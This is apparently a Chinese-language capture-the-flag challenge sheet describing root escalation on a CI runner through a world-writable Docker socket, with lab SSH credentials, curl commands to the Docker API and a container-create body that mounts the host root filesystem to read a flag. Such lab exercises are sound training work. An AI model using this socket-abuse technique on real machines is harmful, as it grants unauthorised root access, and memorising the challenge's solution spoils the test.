# 第 9 题：连上 docker.sock 就等于 root

## 场景

这是一台 **CI Runner**。流水线需要在一个小型的 Docker API 端点上启动构建容器，
socket 位于 `/var/run/docker.sock`，权限放得很宽（`srw-rw-rw-`）。

你（`player`）是流水线维护人员，能登录这台机器。

## 目标

拿到 root 权限（读取 `/flag.txt` 的内容）：

```bash
# 最终能读到 /flag.txt 里的 Ly_Flag{...}
```

## 登录

```bash
ssh -p 22009 player@<主机IP>
# 密码：Player@2026
```

## 提示

1. 找到 Docker 的 socket，看它的权限：
   ```bash
   ls -l /var/run/docker.sock
   ```
2. 你能不能用 `curl` 通过 unix socket 直接调用 API，而不需要 docker 客户端？
   ```bash
   curl -s --unix-socket /var/run/docker.sock http://localhost/version
   ```
3. Docker API 能创建容器。创建容器的请求里可以指定 **挂载**：
   ```json
   {"Image":"alpine","Cmd":["cat","/host/flag.txt"],"Binds":["/:/host"]}
   ```
   想一想：`-v /:/host` 意味着什么？
4. 用 `curl` 依次调用 `POST /containers/create` → `POST /containers/{id}/start` →
   `GET /containers/{id}/logs`，就能拿到容器输出。
5. 输出里应该就能看到 `Ly_Flag{...}`。

## 评分

读到 `Ly_Flag{...}` 即为通过。
